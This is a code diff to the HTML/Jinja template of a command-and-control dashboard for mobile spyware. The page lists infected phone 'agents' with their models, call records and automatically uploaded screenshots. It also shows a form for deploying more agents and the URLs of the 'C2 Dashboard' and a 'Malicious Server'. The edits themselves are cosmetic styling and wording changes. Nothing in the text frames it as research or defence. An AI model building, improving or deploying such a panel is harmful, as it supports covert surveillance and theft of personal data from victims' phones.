@@ -14,12 +14,13 @@
         .agent-card { background: #3d3d3d; padding: 15px; border-radius: 8px; border-left: 4px solid #28a745; }
         .screenshot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; }
         .screenshot-item { background: #3d3d3d; padding: 10px; border-radius: 8px; text-align: center; }
-        .screenshot-img { width: 100%; height: 120px; object-fit: cover; border-radius: 5px; }
+        .screenshot-img { width: 100%; height: 120px; object-fit: cover; border-radius: 5px; background: #2d2d2d; }
         .nav { background: #007bff; padding: 15px 20px; display: flex; justify-content: space-between; }
         .nav a { color: white; text-decoration: none; padding: 10px 15px; border-radius: 5px; }
         .deploy-form { background: #3d3d3d; padding: 20px; border-radius: 8px; margin-top: 20px; }
-        .deploy-form input { padding: 10px; margin: 5px; background: #4d4d4d; border: 1px solid #555; color: white; border-radius: 5px; }
+        .deploy-form input { padding: 10px; margin: 5px; background: #4d4d4d; border: 1px solid #555; color: white; border-radius: 5px; width: 300px; }
         .deploy-form button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        .server-info { background: #28a745; padding: 10px; border-radius: 5px; margin: 10px 0; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -29,6 +30,10 @@
             <a href="/dashboard">Refresh</a>
             <a href="/logout">Logout</a>
         </div>
+    </div>
+
+    <div class="server-info">
+        <strong>Online Server:</strong> {{ c2_url }} | <strong>Status:</strong> 🟢 OPERATIONAL
     </div>
 
     <div class="stats">
@@ -57,15 +62,15 @@
             {% for agent in agents %}
             <div class="agent-card">
                 <h3>{{ agent['agent_id'] }}</h3>
-                <p><strong>Model:</strong> {{ agent['phone_model'] }}</p>
-                <p><strong>Last Seen:</strong> {{ agent['last_seen'] }}</p>
+                <p><strong>Model:</strong> {{ agent['phone_model'] or 'Unknown' }}</p>
+                <p><strong>Last Seen:</strong> {{ agent['last_seen'] or 'Never' }}</p>
                 <p><strong>Screenshots:</strong> {{ agent['screenshot_count'] }}</p>
                 <p><strong>Calls:</strong> {{ agent['call_records'] }}</p>
             </div>
             {% endfor %}
         </div>
         {% else %}
-        <p>No active agents. Deploy some agents!</p>
+        <p>No active agents. Deploy some agents to see them here!</p>
         {% endif %}
     </div>
 
@@ -76,15 +81,16 @@
             {% for screenshot in screenshots %}
             <div class="screenshot-item">
                 <a href="/media/screenshot/{{ screenshot['id'] }}" target="_blank">
-                    <img src="/media/screenshot/{{ screenshot['id'] }}" alt="Screenshot" class="screenshot-img">
+                    <img src="/media/screenshot/{{ screenshot['id'] }}" alt="Screenshot" class="screenshot-img"
+                         onerror="this.style.backgroundColor='#2d2d2d'">
                 </a>
-                <div>{{ screenshot['agent_id'] }}</div>
+                <div><strong>{{ screenshot['agent_id'] }}</strong></div>
                 <small>{{ screenshot['timestamp'] }}</small>
             </div>
             {% endfor %}
         </div>
         {% else %}
-        <p>No screenshots available.</p>
+        <p>No screenshots available. Agents will upload screenshots automatically.</p>
         {% endif %}
     </div>
 
@@ -98,9 +104,11 @@
             </form>
         </div>
         
-        <h3>Server URLs:</h3>
-        <p><strong>C2 Dashboard:</strong> {{ c2_url }}</p>
-        <p><strong>Malicious Server:</strong> {{ malicious_url }}</p>
+        <div style="margin-top: 20px; padding: 15px; background: #2d2d2d; border-radius: 8px;">
+            <h3>🌐 Server URLs</h3>
+            <p><strong>C2 Dashboard:</strong> {{ c2_url }}</p>
+            <p><strong>Malicious Server:</strong> {{ malicious_url }}</p>
+        </div>
     </div>
 </body>
 </html>
